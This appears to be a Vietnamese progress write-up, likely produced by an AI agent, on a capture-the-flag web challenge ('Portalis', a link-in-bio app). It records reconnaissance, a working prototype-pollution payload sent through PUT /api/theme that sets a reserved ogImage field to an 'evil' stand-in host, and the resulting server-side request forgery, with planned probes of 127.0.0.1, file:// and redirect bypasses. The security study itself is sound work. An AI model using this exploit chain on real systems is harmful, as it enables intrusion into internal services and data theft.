## Các finding đã có được

### 1. Tình trạng kết nối (đã xác nhận)

Server `91.107.189.166:3000` **không ổn định**: lúc refused, lúc HTTP 200, lúc timeout. Phải retry nhiều lần mới fetch được từng trang. Đây là lý do tiến độ chậm.

### 2. Cấu trúc site (đã xác nhận)

**Portalis** = app "link-in-bio" theo theme Rick & Morty, gồm các trang: `/` (home), `/dashboard`, `/explore`, `/help`, `/about`, và trang công khai `/u/<user>`.

### 3. Tình tiết quan trọng nhất — `/api/schema` (đã xác nhận)

```json
{
  "settable": ["name", "bio", "accent", "avatarUrl", "links"],
  "rendered_context": [
    "name",
    "bio",
    "accent",
    "avatarUrl",
    "links",
    "ogImage"
  ],
  "note": "ogImage is reserved and populated by the media pipeline; it is not accepted from theme input"
}
```

→ `ogImage` **nằm trong context dùng để render** nhưng **không nằm trong danh sách field được phép set**. Nó được "media pipeline" điền vào.

### 4. Cơ chế API từ trang Help (đã xác nhận)

- `PUT /api/theme` — nhận JSON theme, và quan trọng nhất: **"Fields are deep-merged into your existing profile"** (deep-merge vào object profile sẵn có)
- `GET /api/preview` — diagnostics dạng plain-text cho preview card
- `GET /api/schema`, `GET /u/me`
- Dashboard có hộp **"Advanced: raw theme JSON"** gửi JSON thẳng, nguyên văn (as-is)

### 5. Hai giả thuyết lỗ hổng chính (chưa kiểm chứng)

**a) Prototype pollution / mass assignment qua deep-merge:**
Deep-merge JSON người dùng vào object profile + việc `ogImage` là field "reserved" nhưng vẫn nằm trong rendered context là dấu hiệu kinh điển: gửi `"__proto__": {...}` hoặc `constructor.prototype` trong `PUT /api/theme` để ghi đè field không được phép (như `ogImage`), hoặc pollute prototype ảnh hưởng tới render pipeline.

**b) SSRF qua `avatarUrl`:**
Câu chữ challenge khớp mạnh: "creates a polished preview whenever a profile is shared" (media pipeline fetch URL để tạo og:image), "be careful where your profile **points**" (URL trong profile), "anything **behind the portal** is none of your business" (service nội bộ). Nếu pipeline fetch `avatarUrl` không validate → trỏ vào `http://127.0.0.1/...` hoặc internal metadata để lấy flag.

### 6. Chưa làm được

- Chưa probe được `/api/preview`, `/u/me`, `/api/theme` (lỗi mạng + một lần tool bị lỗi internal)
- Chưa tạo tài khoản / chưa gửi `PUT /api/theme` nào
- Chưa có flag

**Kết luận giai đoạn hiện tại:** recon xong, dấu hiệu dẫn tới _prototype pollution qua deep-merge_ (nỗ lực set `ogImage`) kết hợp _SSRF qua avatarUrl_ là hướng exploitation chính cần thử khi server ổn định.

## Các bước đã thực hiện

1. **Trinh sát kết nối** — server `91.107.189.166:3000` rất chập chờn (refused → 200 → timeout), phải viết hàm retry cho mọi request.
2. **Lấy toàn bộ trang tĩnh**: `/`, `/help`, `/about`, `/explore`, `/dashboard` (kèm đọc hết JS inline của dashboard).
3. **Lấy `/api/schema`** và probe các endpoint: `/api/preview`, `/u/me`, `/api/me` (404), `/api/users` (404), `/api/profile` (404).
4. **Tạo session** — phát hiện `PUT /api/theme` hoạt động **không cần đăng ký/đăng nhập**: server tự set cookie HttpOnly `sid` và tạo profile. Không có auth thực sự.
5. **Chạy 5 biến bản prototype pollution** qua `PUT /api/theme`, đo kết quả bằng `GET /api/preview` và `/u/me`.
6. **Bắt đầu khai thác SSRF vào nội bộ** (`http://127.0.0.1:3000/...`) — chưa kết luận được.

## Findings đã xác nhận

**✅ Finding 1 — Cấu trúc & cơ chế**

- `PUT /api/theme`: JSON được **deep-merge** vào profile ("omit a field to leave it unchanged").
- `GET /api/preview`: diagnostics plain-text, không cần auth.
- `/u/me` render profile có thẻ `<meta property="og:image" content="">` và dòng `portal-diag`.

**✅ Finding 2 — Mảnh ghép quan trọng nhất (`/api/schema`)**

```json
{
  "settable": ["name", "bio", "accent", "avatarUrl", "links"],
  "rendered_context": [
    "name",
    "bio",
    "accent",
    "avatarUrl",
    "links",
    "ogImage"
  ],
  "note": "ogImage is reserved and populated by the media pipeline; it is not accepted from theme input"
}
```

`ogImage` nằm trong **rendered context** nhưng bị cấm set trực tiếp → mục tiêu rõ ràng.

**✅ Finding 3 — Prototype pollution THÀNH CÔNG (đã có proof)**

- Set `ogImage` trực tiếp (top-level) → **400 Bad Request** (bị chặn như schema nói).
- Nhưng gửi:

```json
{"bio":"v7"," "__proto__":{"ogImage":"http://evil/og.png"}}
```

→ **HTTP 200**, và `GET /api/preview` trả về:

```
fetch failed: getaddrinfo ETIMEOUT evil
```

→ Deep-merge không bảo vệ `__proto__` → **pollute được prototype**, đặt được `ogImage` như property kế thừa, và **preview pipeline fetch URL đó phía server**.

**✅ Finding 4 — SSRF xác nhận + error oracle**
Thông báo lỗi `fetch failed: getaddrinfo ETIMEOUT ...` là lỗi Node/undici, chứng minh server chủ động fetch URL mình điều khiển. Lỗi này còn làm **oracle** phân biệt được hostname không resolve được vs các lỗi khác.

**❌ Các biến bản KHÔNG hoạt động**: `constructor.prototype`, `__proto__` lồng trong `links`, lồng sâu `links.a.__proto__` — chỉ `__proto__` ở **top-level** mới pollute.

**⚠️ Chưa kết luận / việc còn lại**

- SSRF tới `http://127.0.0.1:3000/api/schema`: PUT thành công nhưng đọc preview chỉ được **502 nginx** (nginx/1.31.4) hoặc **kết quả cũ** ("ETIMEOUT evil") — nghi ngờ app tự fetch vào chính nó gây treo/crash (Node single-thread) hoặc preview bị cache. Vòng test cuối bị mất kết quả do lỗi tool.
- Chưa biết preview có **reflecx body** của response SSRF không (mới chỉ thấy error message) — đây là bước quyết định để đọc flag.
- Chưa thử: port nội bộ khác, `file://`, `http://localhost`, redirect bypass.
- **Chưa có flag.**

**Chuỗi khai thác đang mở:** prototype pollution → gán `ogImage` → SSRF từ preview pipeline → (cần xác nhận) đọc phản hồi nội bộ → flag, khớp với gợi ý "be careful where your profile points".
